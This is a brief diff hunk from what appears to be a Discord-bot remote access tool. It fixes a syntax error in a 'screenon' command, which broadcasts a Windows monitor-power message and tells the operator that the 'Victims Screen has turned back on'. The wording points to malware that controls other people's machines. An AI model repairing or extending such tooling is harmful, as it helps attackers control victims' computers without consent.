@@ -503,7 +503,7 @@ async def screenon(ctx, seshn):
     session = sessions.get(seshn.lower())
     if session:
         ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
-        await.send("Victims Screen has turned back on...")
+        await ctx.send("Victims Screen has turned back on...")
     else:
         pass
     
